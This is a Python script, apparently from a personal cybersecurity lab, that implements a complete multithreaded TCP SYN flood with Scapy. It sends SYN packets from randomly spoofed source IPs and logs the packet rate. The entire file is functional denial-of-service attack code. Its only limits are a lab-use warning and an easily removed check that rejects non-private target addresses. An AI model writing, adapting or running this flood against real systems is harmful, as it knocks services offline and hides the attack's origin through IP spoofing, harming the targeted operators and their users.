#!/usr/bin/env python3
"""
===========================================================================
 SYN Flood Attack Simulator
 DDoS Simulation Lab — Personal Cybersecurity Research
 Author  : Cleveland Henry
 Target  : VirtualBox Lab VM (Isolated Network)
 Purpose : Educational simulation of TCP SYN flood behaviour
 WARNING : Authorised lab use ONLY. Illegal on real/production systems.
===========================================================================
"""

import threading
import time
import random
import argparse
import sys
import json
import os
from datetime import datetime

# ── Logging ───────────────────────────────────────────────────────────────────

LOG_FILE = os.path.join(os.path.dirname(__file__), "..", "logs", "syn_flood.log")
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

stats = {
    "packets_sent": 0,
    "errors":       0,
    "start_time":   None,
    "target_ip":    "",
    "target_port":  0,
    "duration":     0,
}
stats_lock = threading.Lock()


def log(msg: str, level: str = "INFO") -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] [{level}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


# ── Random spoofed IP ─────────────────────────────────────────────────────────

def random_ip() -> str:
    """Random public-looking IP for spoofing source."""
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        first = int(ip.split(".")[0])
        if first not in (10, 127, 169, 172, 192, 224, 240):
            return ip


# ── Flood worker using Scapy ──────────────────────────────────────────────────

def flood_worker(target_ip: str, target_port: int, stop_event: threading.Event) -> None:
    try:
        from scapy.all import IP, TCP, send, conf
        conf.verb = 0  # suppress Scapy output
    except ImportError:
        log("Scapy not found. Run: sudo apt install python3-scapy", "ERROR")
        stop_event.set()
        return

    while not stop_event.is_set():
        try:
            src_ip   = random_ip()
            src_port = random.randint(1024, 65535)
            seq      = random.randint(0, 4294967295)

            pkt = IP(src=src_ip, dst=target_ip) / TCP(
                sport=src_port,
                dport=target_port,
                flags="S",       # SYN flag
                seq=seq,
                window=random.randint(8192, 65535),
            )
            send(pkt, verbose=0)

            with stats_lock:
                stats["packets_sent"] += 1

        except Exception as e:
            with stats_lock:
                stats["errors"] += 1


# ── Orchestrator ──────────────────────────────────────────────────────────────

def run_syn_flood(target_ip: str, target_port: int, duration: int, threads: int) -> dict:
    log("═══════════════════════════════════════════════════")
    log("  SYN FLOOD SIMULATION STARTING")
    log(f"  Target  : {target_ip}:{target_port}")
    log(f"  Duration: {duration}s  |  Threads: {threads}")
    log("  WARNING : AUTHORISED LAB ENVIRONMENT ONLY")
    log("═══════════════════════════════════════════════════")

    stats["target_ip"]   = target_ip
    stats["target_port"] = target_port
    stats["duration"]    = duration
    stats["start_time"]  = datetime.now().isoformat()

    stop_event = threading.Event()
    workers = [
        threading.Thread(
            target=flood_worker,
            args=(target_ip, target_port, stop_event),
            daemon=True,
        )
        for _ in range(threads)
    ]
    for w in workers:
        w.start()

    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            elapsed = duration - (end_time - time.time())
            with stats_lock:
                sent = stats["packets_sent"]
                errs = stats["errors"]
            pps = sent / max(elapsed, 0.1)
            sys.stdout.write(
                f"\r  ⚡ Packets sent: {sent:,}  |  "
                f"Rate: {pps:,.0f} pkt/s  |  "
                f"Errors: {errs}  |  "
                f"Elapsed: {elapsed:.1f}s / {duration}s   "
            )
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        log("\nSimulation interrupted by user.", "WARN")

    stop_event.set()
    for w in workers:
        w.join(timeout=3)

    stats["end_time"] = datetime.now().isoformat()
    total_time = (
        datetime.fromisoformat(stats["end_time"]) -
        datetime.fromisoformat(stats["start_time"])
    ).total_seconds()
    stats["avg_pps"] = round(stats["packets_sent"] / max(total_time, 1), 2)

    print()
    log(f"  Simulation complete. Total packets: {stats['packets_sent']:,}")
    log(f"  Errors: {stats['errors']}  |  Average rate: {stats['avg_pps']} pkt/s")

    result_path = os.path.join(os.path.dirname(__file__), "..", "logs", "syn_results.json")
    os.makedirs(os.path.dirname(result_path), exist_ok=True)
    with open(result_path, "w") as f:
        json.dump(stats, f, indent=2)
    log(f"  Results saved → {result_path}")

    return stats


# ── CLI Entry ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SYN Flood Simulator — DDoS Lab (Authorised Lab Only)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("target",           help="Target IP (lab VM only)")
    parser.add_argument("-p", "--port",     type=int, default=80,  help="Target port (default: 80)")
    parser.add_argument("-d", "--duration", type=int, default=30,  help="Duration in seconds (default: 30)")
    parser.add_argument("-t", "--threads",  type=int, default=10,  help="Thread count (default: 10)")
    args = parser.parse_args()

    # Safety guard — private IPs only
    allowed = ("192.168.", "10.", "172.16.", "172.17.", "172.18.",
               "172.19.", "172.20.", "172.21.", "172.22.", "172.23.",
               "172.24.", "172.25.", "172.26.", "172.27.", "172.28.",
               "172.29.", "172.30.", "172.31.", "127.")
    if not any(args.target.startswith(r) for r in allowed):
        log("Target IP is not a private/lab address. Aborting for safety.", "ERROR")
        sys.exit(1)

    run_syn_flood(args.target, args.port, args.duration, args.threads)
